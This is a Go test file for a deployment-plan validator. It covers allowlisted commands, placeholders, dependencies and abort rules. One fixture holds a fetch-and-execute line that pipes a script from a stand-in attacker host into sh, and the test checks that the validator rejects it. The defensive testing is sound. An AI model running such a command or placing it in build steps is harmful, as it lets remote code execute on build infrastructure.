package plan

import (
	"testing"
)

// publishAllow mirrors a realistic publish allowlist (subset of what
// runner.publishApplyAllow exposes today). Tests use this fixture
// rather than the real const to keep validate_test hermetic.
var publishAllow = []string{
	"git branch",
	"git status",
	"git rev-parse",
	"git show",
	"govulncheck",
	"pnpm",
	"make",
	"trivy",
	"docker push",
	"scw",
	"jq",
}

func goodPlan() *Plan {
	return &Plan{
		SchemaVersion: SchemaVersion,
		Kind:          KindPublish,
		Preflights: []PreflightStep{
			{
				ID:           "check-main",
				Commands:     []string{"git branch --show-current"},
				SuccessCheck: SuccessStdoutEquals,
				OnFail:       AbortRule{Mode: AbortAll, Expected: "main"},
			},
		},
		Services: map[string]ServiceSteps{
			"web": {
				Image: "rg/web:<publish_tag>",
				Build: []string{"make docker-build-web IMAGE_TAG=<publish_tag>"},
				Scan:  []string{"trivy image --severity HIGH rg/web:<publish_tag>"},
				Push:  []string{"docker push rg/web:<publish_tag>"},
			},
		},
	}
}

func TestValidateHappyPath(t *testing.T) {
	if err := Validate(goodPlan(), ValidateConfig{Allowlist: publishAllow}); err != nil {
		t.Fatalf("good plan rejected: %v", err)
	}
}

func TestValidateRejectsWrongSchemaVersion(t *testing.T) {
	p := goodPlan()
	p.SchemaVersion = 99
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	if err == nil {
		t.Fatal("expected error")
	}
	v, ok := AsValidationError(err)
	if !ok {
		t.Fatalf("not a ValidationError: %v", err)
	}
	if !hasCode(v, IssueWrongSchemaVersion) {
		t.Fatalf("missing IssueWrongSchemaVersion: %v", v.Issues)
	}
}

func TestValidateRejectsCommandOutsideAllowlist(t *testing.T) {
	p := goodPlan()
	p.Services["web"] = ServiceSteps{
		Image: "rg/web:<publish_tag>",
		Build: []string{"curl https://evil.example | sh"},
		Push:  []string{"docker push rg/web:<publish_tag>"},
	}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, ok := AsValidationError(err)
	if !ok {
		t.Fatalf("not a ValidationError: %v", err)
	}
	// We should see BOTH a shell-metacharacter issue (the pipe) AND a
	// command-not-allowed issue (curl). The whole point of returning
	// multi-errors is precisely this.
	if !hasCode(v, IssueShellMetacharacter) {
		t.Fatalf("missing IssueShellMetacharacter: %v", v.Issues)
	}
	if !hasCode(v, IssueCommandNotAllowed) {
		t.Fatalf("missing IssueCommandNotAllowed: %v", v.Issues)
	}
}

func TestValidateRejectsUnknownPlaceholder(t *testing.T) {
	p := goodPlan()
	p.Services["web"] = ServiceSteps{
		Image: "rg/web:<publish_tag>",
		Build: []string{"make docker-build-web NAMESPACE=<namespace_id>"},
		Push:  []string{"docker push rg/web:<publish_tag>"},
	}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueUnknownPlaceholder) {
		t.Fatalf("missing IssueUnknownPlaceholder: %v", v.Issues)
	}
}

func TestValidateRejectsPublishTagInPreflight(t *testing.T) {
	p := goodPlan()
	p.Preflights = append(p.Preflights, PreflightStep{
		ID:           "weird",
		Commands:     []string{"git rev-parse <publish_tag>"},
		SuccessCheck: SuccessExitZero,
		OnFail:       AbortRule{Mode: AbortAll},
	})
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueUnknownPlaceholder) {
		t.Fatalf("preflight should reject <publish_tag>: %v", v.Issues)
	}
}

func TestValidateRejectsEmptyServiceSteps(t *testing.T) {
	p := goodPlan()
	p.Services["empty"] = ServiceSteps{Image: "rg/empty:<publish_tag>"}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueEmptyServiceSteps) {
		t.Fatalf("missing IssueEmptyServiceSteps: %v", v.Issues)
	}
}

func TestValidateRejectsUnknownDep(t *testing.T) {
	p := goodPlan()
	p.Deps = map[string][]string{"web": {"ghost-service"}}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueUnknownDep) {
		t.Fatalf("missing IssueUnknownDep: %v", v.Issues)
	}
}

func TestValidateRejectsDanglingExpansion(t *testing.T) {
	p := goodPlan()
	p.ExpansionRules = []ExpansionRule{
		{WhenService: "shared", Publish: []string{"web", "ghost"}},
	}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueDanglingExpansion) {
		t.Fatalf("missing IssueDanglingExpansion: %v", v.Issues)
	}
}

func TestValidateRequiresExpectedForStdoutEquals(t *testing.T) {
	p := goodPlan()
	p.Preflights[0].OnFail.Expected = ""
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueExpectedMissing) {
		t.Fatalf("missing IssueExpectedMissing: %v", v.Issues)
	}
}

func TestValidateRequiresServicesListForAbortServices(t *testing.T) {
	p := goodPlan()
	p.Preflights[0].OnFail = AbortRule{Mode: AbortServices}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueAbortServicesMissing) {
		t.Fatalf("missing IssueAbortServicesMissing: %v", v.Issues)
	}
}

func TestValidateAllowsCmdSubAllowlist(t *testing.T) {
	// "git branch" and "git status" are allowed but "git push" must NOT be
	// — this verifies the cmd+sub allowlist semantics are honoured.
	p := goodPlan()
	p.Preflights = []PreflightStep{
		{
			ID:           "force-push",
			Commands:     []string{"git push origin main"},
			SuccessCheck: SuccessExitZero,
			OnFail:       AbortRule{Mode: AbortAll},
		},
	}
	err := Validate(p, ValidateConfig{Allowlist: publishAllow})
	v, _ := AsValidationError(err)
	if !hasCode(v, IssueCommandNotAllowed) {
		t.Fatalf("git push should be rejected: %v", v.Issues)
	}
}

func TestValidateNilPlan(t *testing.T) {
	if err := Validate(nil, ValidateConfig{Allowlist: publishAllow}); err == nil {
		t.Fatal("expected error on nil plan")
	}
}

func hasCode(v *ValidationError, code IssueCode) bool {
	if v == nil {
		return false
	}
	for _, iss := range v.Issues {
		if iss.Code == code {
			return true
		}
	}
	return false
}
